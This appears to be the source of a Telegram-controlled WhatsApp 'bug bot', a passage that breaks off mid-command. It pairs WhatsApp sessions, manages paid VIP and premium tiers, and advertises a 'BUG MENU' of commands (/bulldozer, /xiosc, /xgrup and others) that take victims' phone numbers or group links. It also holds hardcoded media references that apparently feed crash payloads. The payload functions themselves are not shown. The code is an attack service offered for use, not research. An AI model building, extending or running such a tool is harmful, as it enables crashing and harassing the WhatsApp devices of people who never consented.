const config = require("./config");
const TelegramBot = require("node-telegram-bot-api");
const {
  default: makeWASocket,
  useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("lotusbail");
const axios = require("axios");
const fs = require("fs");
const P = require("pino");
const path = require("path");
const chalk = require('chalk');
//===================================================//
const token = config.BOT_TOKEN;
const bot = new TelegramBot(token, { polling: true });
const { OWNER_ID } = require("./config");
//===================================================//
const SESSIONS_FILE = "./activeSessions.json";
const SESSIONS_DIR = "./sessions";
const sessions = new Map();
//===================================================//
const OWNER_FILE = path.join(__dirname, "database", "owner.json");
const VIP_FILE = path.join(__dirname, "database", "vip.json");
const PREMIUM_FILE = path.join(__dirname, "database", "premium.json");
const SETTINGS_FILE = path.join(__dirname, "database", "settings.json");
const COOLDOWN_FILE = path.join(__dirname, "database", "cooldown.json");
/** const { addVipDuration, loadVipData, saveVipData, isVip } = require("./database/vip");
const { loadOwnerData, saveOwnerData,  isOwner } = require("./database/owner");
const { loadPremiumData,  savePremiumData,  isPremium, addPremiumDuration } = require("./database/premium"); **/

//===================================================//
const photo = "https://files.catbox.moe/t766bw.jpg";
const sending = "https://files.catbox.moe/0gcof6.jpg";
//===================================================//
function loadVipData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(VIP_FILE)) {
      const data = fs.readFileSync(VIP_FILE, "utf8");
      return JSON.parse(data);
    }
    return {};
  } catch (error) {
    console.error("Error loading VIP data:", error);
    return {};
  }
}

function saveVipData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(VIP_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving VIP data:", error);
  }
}

function isVip(userId) {
  const vipData = loadVipData();
  if (!vipData[userId]) return false;
  return vipData[userId].expiry > Date.now();
}

function addVipDuration(duration) {
  const durations = {
    h: 60 * 60 * 1000,
    d: 24 * 60 * 60 * 1000,
    w: 7 * 24 * 60 * 60 * 1000,
    m: 30 * 24 * 60 * 60 * 1000,
  };

  const match = duration.match(/^(\d+)([hdwm])$/);
  if (!match) return null;

  const [_, amount, unit] = match;
  return parseInt(amount) * durations[unit];
}

module.exports = {
  isVip,
  loadVipData,
  saveVipData,
  addVipDuration,
};

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function loadOwnerData() {
  if (!fs.existsSync(OWNER_FILE)) {
    const defaultData = { owners: [] };
    fs.writeFileSync(OWNER_FILE, JSON.stringify(defaultData, null, 2));
    return defaultData;
  }
  return JSON.parse(fs.readFileSync(OWNER_FILE));
}

function saveOwnerData(data) {
  fs.writeFileSync(OWNER_FILE, JSON.stringify(data, null, 2));
}

function isOwner(userId) {
  const data = loadOwnerData();
  return data.owners.includes(Number(userId));
}

function loadCooldowns() {
  ensureCooldownFileExists();
  return JSON.parse(fs.readFileSync(COOLDOWN_FILE));
}

function saveCooldowns(data) {
  ensureCooldownFileExists();
  fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
}

function ensureCooldownFileExists() {
  const dir = path.dirname(COOLDOWN_FILE);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
  if (!fs.existsSync(COOLDOWN_FILE)) {
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify({}, null, 2));
  }
}

ensureCooldownFileExists();

function parseDuration(text) {
  const match = text.match(/^(\d+)([hdwm])$/i);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();

  const unitMap = {
    h: 60 * 60 * 1000,
    d: 24 * 60 * 60 * 1000,
    w: 7 * 24 * 60 * 60 * 1000,
    m: 30 * 24 * 60 * 60 * 1000,
  };

  return unitMap[unit] ? value * unitMap[unit] : null;
}

function isInCooldown(userId) {
  const cooldowns = loadCooldowns();
  const now = Date.now();
  if (!cooldowns[userId]) return false; 
  return now < cooldowns[userId];
}
function getCooldownRemaining(userId) {
  const cooldowns = loadCooldowns();
  const now = Date.now();

  if (!cooldowns[userId]) return 0;
  const diffMs = cooldowns[userId] - now;
  return Math.ceil(diffMs / 1000);
}

function loadPremiumData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(PREMIUM_FILE)) {
      const data = fs.readFileSync(PREMIUM_FILE, "utf8");
      return JSON.parse(data);
    }
    return {};
  } catch (error) {
    console.error("Error loading premium data:", error);
    return {};
  }
}

function savePremiumData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(PREMIUM_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving premium data:", error);
  }
}

function isPremium(userId) {
  const premiumData = loadPremiumData();
  if (!premiumData[userId]) return false;
  return premiumData[userId].expiry > Date.now();
}

function removePremiumUser(userId) {  const premiumData = loadPremiumData();  if (!premiumData[userId]) return false;  delete premiumData[userId];  savePremiumData(premiumData);  return true;}

function addPremiumDuration(duration) {
  const durations = {
    h: 60 * 60 * 1000,
    d: 24 * 60 * 60 * 1000,
    w: 7 * 24 * 60 * 60 * 1000,
    m: 30 * 24 * 60 * 60 * 1000,
  };

  const match = duration.match(/^(\d+)([hdwm])$/);
  if (!match) return null;

  const [_, amount, unit] = match;
  return parseInt(amount) * durations[unit];
}

let startMessage;
let startButton;

function handleOnlyAccess(msg, commandInput, accessType) {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Anda tidak memiliki akses.");
  }

  const commandName = commandInput.trim().toLowerCase();
  if (!commandName) {
    return bot.sendMessage(chatId, `❌ Format salah!\nContoh: /${accessType.replace("Only", "only")} bulldozer`);
  }

  const dbDir = path.join(__dirname, "database");
  if (!fs.existsSync(dbDir)) {
    fs.mkdirSync(dbDir, { recursive: true });
  }

  if (!fs.existsSync(SETTINGS_FILE)) {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify({ vipOnly: [], premiumOnly: [], ownerOnly: [] }, null, 2));
  }

  const settings = JSON.parse(fs.readFileSync(SETTINGS_FILE));
  if (!Array.isArray(settings[accessType])) settings[accessType] = [];

  settings[accessType].push(commandName);
  fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2));

  return bot.sendMessage(
    chatId,
    `✅ Command *${commandName}* sekarang hanya dapat diakses oleh *${accessType.replace("Only", "").toUpperCase()}*.`,
    { parse_mode: "Markdown" }
  );
}

// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

// --- Fungsi untuk Menyimpan Daftar Device ---
const saveDeviceList = () => {
    fs.writeFileSync('./ListDevice.json', JSON.stringify(deviceList));
};

// --- Fungsi untuk Menambahkan Device ke Daftar ---
const addDeviceToList = (userId, token) => {
    const deviceNumber = deviceList.length + 1;
    deviceList.push({
        number: deviceNumber,
        userId: userId,
        token: token
    });
    saveDeviceList();
    console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.white.bold('DETECT NEW PERANGKAT')}
┃ ${chalk.white.bold('DEVICE NUMBER: ')} ${chalk.yellow.bold(deviceNumber)}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
};

function saveActiveSessions(botNumber) {
  try {
    const sessionsList = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessionsList.push(...existing, botNumber);
      } else {
        return;
      }
    } else {
      sessionsList.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsList));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ FOUND ACTIVE WHATSAPP SESSION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ TOTAL : ${activeNumbers.length} 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

      for (const botNumber of activeNumbers) {
        console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ CURRENTLY CONNECTING WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sheesh = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sheesh.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`✅ Connected to ${botNumber}`);
              sessions.set(botNumber, sheesh);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
              if (shouldReconnect) {
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Connection closed"));
              }
            }
          });
          sheesh.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

async function connectToWhatsApp(botNumber, bot, chatId) {
  const statusMessage = await bot.sendMessage(chatId, `╔══════════════════════╗  
║      INFORMATION      
╠══════════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : INITIALIZATION  
╚══════════════════════╝`, { parse_mode: "Markdown" });

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sheesh = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sheesh.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `╔═══════════════════╗  
║    INFORMATION    
╠═══════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : RECONNECTING  
╚═══════════════════╝`,
          { chat_id: chatId, message_id: statusMessage.message_id, parse_mode: "Markdown" }
        );
        await connectToWhatsApp(botNumber, bot, chatId);
      } else {
        await bot.editMessageText(
          `╔═══════════════════╗  
║    INFORMATION    
╠═══════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : FAILED  
╚═══════════════════╝`,
          { chat_id: chatId, message_id: statusMessage.message_id, parse_mode: "Markdown" }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sheesh);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `╔═══════════════════╗  
║    INFORMATION    
╠═══════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : CONNECTED  
╚═══════════════════╝`,
        { chat_id: chatId, message_id: statusMessage.message_id, parse_mode: "Markdown" }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const customCode = "BLEKTROT";
          await sheesh.requestPairingCode(botNumber, customCode);
          const formattedCode = `\`${customCode.match(/.{1,4}/g).join("-")}\``;
          await bot.editMessageText(
            `╔══════════════════════╗  
║    PAIRING SESSION  
╠══════════════════════╣  
║ NUMBER : ${botNumber}  
║ CODE   : ${formattedCode}  
╚══════════════════════╝`,
            { chat_id: chatId, message_id: statusMessage.message_id, parse_mode: "Markdown" }
          );
        }
      } catch (error) {
        console.error("Pairing code error:", error);
        await bot.editMessageText(
          `╔══════════════════════╗  
║    PAIRING SESSION   
╠══════════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : ${error.message}  
╚══════════════════════╝`,
          { chat_id: chatId, message_id: statusMessage.message_id, parse_mode: "Markdown" }
        );
      }
    }
  });

  sheesh.ev.on("creds.update", saveCreds);
  return sheesh;
}

// (exports moved to end of file)

async function initializeBot() {
  if (config.BOT_TOKEN)
    try {
      console.log(`╭─────────────────❍
│ RUNNING... DEVELOPERS @snitchezs
╰─────────────────❍`);

      await initializeWhatsAppConnections();
    } catch (error) {
      console.error(error);
    }
}

initializeBot();
const mediaData = [
  {
    ID: "68917910",
    uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
    buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
    sid: "5e03e0",
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
    ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
    mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
  },
  {
    ID: "68884987",
    uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
    buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
    sid: "5e03e0",
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
    ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
    mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
  },
];

let sequentialIndex = 0;

function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}
//==========[ COMMAND PLACE ]=============

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const name = msg.from.username || msg.from.first_name;

  const startMessage = `\`\`\`𝖲𝖫𝖨𝖯𝖤𝖱𝖸/𝖵𝖤𝖱𝖲𝖨𝖮𝖭
╭═════════════════⚉ 
│   ⚘ 𝗕𝗟𝗔𝗖𝗞 𝗧𝗛𝗥𝗢𝗧𝗧𝗟𝗘 𝗕𝗢𝗧 ⚘
╰═════════════════⚉
╭═════════════════⚉
│ ⚉ /menu
╰═════════════════⚉
╭═════════════════⚉ 
│   ⚘ 𝖶𝖤𝖫𝖢𝖮𝖬𝖤 @${name} ⚘
╰═════════════════⚉
\`\`\`
`;

  const startButton = {
    inline_keyboard: [
      [{ text: "⚘ CHANNELS", url: "https://t.me/stxpos" }],
    ],
};


  try {
    bot.sendPhoto(chatId, photo, {
      caption: startMessage,
      parse_mode: "Markdown", 
      reply_markup: startButton,
    });
  } catch (error) {
    console.error("Error mengirim foto:", error);
    bot.sendMessage(chatId, startMessage, {
      parse_mode: "Markdown",
      reply_markup: startButton,
    });
  }
});

bot.onText(/\/setcd (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "❌ Anda tidak memiliki akses.");
  }

  const [userId, durStr] = match[1].trim().split(/\s+/);

  if (!userId || !durStr) {
    return bot.sendMessage(chatId, "❗ Format salah!\nContoh: /setcd 123456 6h\n(h=jam, d=hari, w=minggu, m=bulan)", { parse_mode: "Markdown" });
  }

  const ms = parseDuration(durStr);
  if (!ms) {
    return bot.sendMessage(chatId, "❗ Format durasi tidak valid. Gunakan: 6h / 2d / 1w / 1m");
  }

  const cooldowns = loadCooldowns();
  cooldowns[userId] = Date.now() + ms;
  saveCooldowns(cooldowns);

  const expireAt = new Date(cooldowns[userId]).toLocaleString("id-ID", {
    dateStyle: "full",
    timeStyle: "short",
  });

  await bot.sendMessage(chatId, `✅ Cooldown untuk ID *${userId}* berhasil diatur hingga:\n *${expireAt}*`, {
    parse_mode: "Markdown",
  });
});

bot.onText(/\/menu/, (msg) => {
  const chatId = msg.chat.id;
  const name = msg.from.username || msg.from.first_name;

  const startMessage = `\`\`\`H!i-@${name}
╭═════════════════⚉ 
│   ⚘ 𝗕𝗟𝗔𝗖𝗞 𝗧𝗛𝗥𝗢𝗧𝗧𝗟𝗘 𝗕𝗢𝗧 ⚘
│        𝖲𝖫𝖨𝖯𝖤𝖱𝖸 𝖵𝖤𝖱𝖲𝖨𝖮𝖭
╰═════════════════⚉
╭═════════════════⚉
│  ⚘ BUG MENU ⚘
│ ⚉ /bulldozer <number>
│ ⚉ /multimate <number1>,<number2>
│ ⚉ /stunt <number>,<hours>
│ ⚉ /splash <number>
│ ⚉ /xiosc <number>
│ ⚉ /xiosi <number>
│ ⚉ /xgrup <link-group>
│ ⚉ /xcomu <link-group>
╰═════════════════⚉
╭═════════════════⚉
│  ⚘ OWNER MENU ⚘
│ ⚉ /addbot <number>
│ ⚉ /addowner <userId>
│ ⚉ /addvip <userId> duration_days
│ ⚉ /addprem <userId> duration_days
│ ⚉ /delbot <deviceId>
│ ⚉ /delowner <userId>
│ ⚉ /delvip <userId> duration_days
│ ⚉ /delprem <userId>
│ ⚉ /setcd <userId> <duration>
│ ⚉ /viponly <command>
│ ⚉ /premiumonly <command>
│ ⚉ /owneronly <command>
│ ⚉ /devices
│ ⚉ /restart
╰═════════════════⚉
╭═════════════════⚉ 
│   ⚘ 𝗕𝗟𝗔𝗖𝗞 𝗧𝗛𝗥𝗢𝗧𝗧𝗟𝗘 𝗕𝗢𝗧 ⚘
│        𝖲𝖫𝖨𝖯𝖤𝖱𝖸 𝖵𝖤𝖱𝖲𝖨𝖮𝖭
╰═════════════════⚉
\`\`\`
`;

  const startButton = {
    inline_keyboard: [
      [{ text: "⚉ BACK", callback_data: "backmenu" }],
      [{ text: "⚘ CHANNELS", url: "https://t.me/stxpos" }],
    ],
};


  try {
    bot.sendPhoto(chatId, photo, {
      caption: startMessage,
      parse_mode: "Markdown", 
      reply_markup: startButton,
    });
  } catch (error) {
    console.error("Error mengirim foto:", error);
    bot.sendMessage(chatId, startMessage, {
      parse_mode: "Markdown",
      reply_markup: startButton,
    });
  }
});

bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, bot, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/\/delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
    `╭─────────────────
│    *MENGHAPUS BOT*    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────`,
    { parse_mode: "Markdown" }
  );

  try {
    const sheesh = sessions.get(botNumber);
    if (sheesh) {
      sheesh.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(
        `╭─────────────────
│    *BOT DIHAPUS*    
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      await bot.editMessageText(
        `╭─────────────────
│    *ERROR*    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(
      `╭─────────────────
│    *ERROR*    
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/devices/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner) {
    return bot.sendMessage(chatId, "❌ Anda tidak memiliki akses.");
  }
  if (!fs.existsSync(SESSIONS_DIR)) {
    return bot.sendMessage(
      chatId,
      "❌ Belum ada bot yang ditambahkan.\nGunakan /addbot untuk menambahkan bot."
    );
  }
  const folders = fs.readdirSync(SESSIONS_DIR).filter((name) => {
    const fullPath = path.join(SESSIONS_DIR, name);
    return fs.statSync(fullPath).isDirectory();
  });
  if (folders.length === 0) {
    return bot.sendMessage(
      chatId,
      "❌ Belum ada bot yang aktif.\nGunakan /addbot untuk menambahkan bot."
    );
  }
  let statusMessage = "╔══════════════════════╗\n";
  statusMessage += "║  LIST WHATSAPP BOT   \n";
  statusMessage += "╠══════════════════════╣\n";

  folders.forEach((number, index) => {
    statusMessage += `║ ◈ Bot ${index + 1}\n`;
    statusMessage += `║ • Owner: ${number}\n`;
    statusMessage += "╠══════════════════════╣\n";
  });

  statusMessage += `║ Total Bot: ${folders.length}\n`;
  statusMessage += "╚══════════════════════╝";

  await bot.sendMessage(chatId, `\`\`\`\n${statusMessage}\n\`\`\``, {
    parse_mode: "Markdown",
  });
});

bot.onText(/\/restart/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();

  const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner) {
    return bot.sendMessage(chatId, "❌ Anda tidak memiliki akses.");
  }

  await bot.sendMessage(chatId, "♻️ Restarting...");

  setTimeout(() => {
    process.exit(0);
  }, 1000);
});


bot.onText(/\/addprem(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const params = match[1].trim().split(/\s+/);

  const isGlobalOwner = OWNER_ID.includes(senderId.toString());
  const isLocalOwner = isOwner(senderId);
  const isUserVip = isVip(senderId);

  if (!isGlobalOwner && !isLocalOwner && !isUserVip) {
    return bot.sendMessage(chatId, `❌ Anda tidak memiliki akses`, {
      parse_mode: "Markdown",
    });
  }

  if (params.length !== 2) {
    return bot.sendMessage(
      chatId,
      "Format salah!\nContoh: /addprem <id> <durasi>\nContoh: /addprem 123456 30d\n┃ Durasi: h=jam, d=hari, w=minggu, m=bulan",
      { parse_mode: "Markdown" }
    );
  }

  const [userId, duration] = params;

  if (!userId || !duration) {
    return bot.sendMessage(
      chatId,
      "Format salah!\nContoh: /addprem 123456 30d\n(h=jam, d=hari, w=minggu, m=bulan)",
      { parse_mode: "Markdown" }
    );
  }

  const durationMs = addPremiumDuration(duration);
  if (!durationMs) {
    return bot.sendMessage(
      chatId,
      "Format durasi salah!\nGunakan: h=jam, d=hari, w=minggu, m=bulan\nContoh: 30d untuk 30 hari",
      { parse_mode: "Markdown" }
    );
  }

  const premiumData = loadPremiumData();

  const expiry = Date.now() + durationMs;
  premiumData[userId] = {
    expiry,
    addedBy: msg.from.id,
    addedAt: Date.now(),
  };

  savePremiumData(premiumData);

  const expiryDate = new Date(expiry).toLocaleString("id-ID", {
    dateStyle: "full",
    timeStyle: "short",
  });

  await bot.sendMessage(
    chatId,
    `ID: ${userId}\nStatus: Premium Ditambahkan\nExpired: ${expiryDate}`,
    { parse_mode: "Markdown" }
  );
});




bot.onText(/\/delvip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetId = match[1].trim();

  const isGlobalOwner = OWNER_ID.includes(senderId.toString());
  const isLocalOwner = isOwner(senderId);

  if (!isGlobalOwner && !isLocalOwner) {
    return bot.sendMessage(chatId, "❌ Anda tidak memiliki akses.");
  }

  if (!targetId || isNaN(targetId)) {
    return bot.sendMessage(chatId, "❌ Format salah!\nContoh: /delvip 123456");
  }

  const vipData = loadVipData();

  if (!vipData[targetId]) {
    return bot.sendMessage(chatId, `⚠️ User ID ${targetId} tidak ditemukan dalam daftar VIP.`);
  }

  delete vipData[targetId];
  saveVipData(vipData);

  await bot.sendMessage(chatId, `✅ VIP berhasil dihapus:\n🆔 ID: ${targetId}`);
});


bot.onText(/\/premiumonly (.+)/, async (msg, match) => {
  handleOnlyAccess(msg, match[1], "premiumOnly");
});

bot.onText(/\/viponly (.+)/, async (msg, match) => {
  handleOnlyAccess(msg, match[1], "vipOnly");
});

bot.onText(/\/owneronly (.+)/, async (msg, match) => {
  handleOnlyAccess(msg, match[1], "ownerOnly");
});

bot.onText(/\/delprem(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = match[1].trim();

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "Anda tidak memiliki akses", {
      parse_mode: "Markdown",
    });
  }

  if (!userId) {
    return bot.sendMessage(
      chatId,
      "Usage: /delprem <id>\nContoh: /delprem 123456",
      { parse_mode: "Markdown" }
    );
  }

  const success = removePremiumUser(userId);

  if (success) {
    await bot.sendMessage(chatId, `User premium dihapus\nID: ${userId}`, {
      parse_mode: "Markdown",
    });
  } else {
    await bot.sendMessage(chatId, `User tidak ditemukan atau`, {
      parse_mode: "Markdown",
    });
  }
});

bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const isGlobalOwner = OWNER_ID.includes(userId.toString());
  
  if (!isGlobalOwner) {
    return bot.sendMessage(chatId, "❌ Anda bukan owner.");
  }

  const newOwnerId = Number(match[1].trim());
  if (!newOwnerId || isNaN(newOwnerId)) {
    return bot.sendMessage(chatId, "Format salah!\nContoh: /addowner 123456");
  }

  const data = loadOwnerData();
  if (data.owners.includes(newOwnerId)) {
    return bot.sendMessage(chatId, "ID tersebut sudah menjadi owner.");
  }

  data.owners.push(newOwnerId);
  saveOwnerData(data);

  bot.sendMessage(chatId, `✅ Owner berhasil ditambahkan:\nID: ${newOwnerId}`);
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const isGlobalOwner = OWNER_ID.includes(userId.toString());
  if (!isGlobalOwner) {
    return bot.sendMessage(chatId, "❌ Anda bukan owner.");
  }
  const delId = Number(match[1].trim());
  const data = loadOwnerData();

  if (!data.owners.includes(delId)) {
    return bot.sendMessage(chatId, "ID tersebut bukan owner.");
  }

  data.owners = data.owners.filter((id) => id !== delId);
  saveOwnerData(data);

  bot.sendMessage(chatId, `Owner berhasil dihapus:\nID: ${delId}`);
});


bot.onText(/\/addvip(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const params = match[1].trim().split(/\s+/);
  
  const isGlobalOwner = OWNER_ID.includes(senderId.toString());
  const isLocalOwner = isOwner(senderId);

  if (!isGlobalOwner && !isLocalOwner && !isVip(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, `❌ Anda tidak memiliki akses`, {
      parse_mode: "Markdown",
    });
  }

  if (params.length !== 2) {
    return bot.sendMessage(
      chatId,
      "Format salah!\nContoh: /addvip <id> <durasi>\nContoh: /addvip 123456 30d\n┃ Durasi: h=jam, d=hari, w=minggu, m=bulan",
      { parse_mode: "Markdown" }
    );
  }

  const [userId, duration] = params;
  const durationMs = addVipDuration(duration);

  if (!durationMs) {
    return bot.sendMessage(
      chatId,
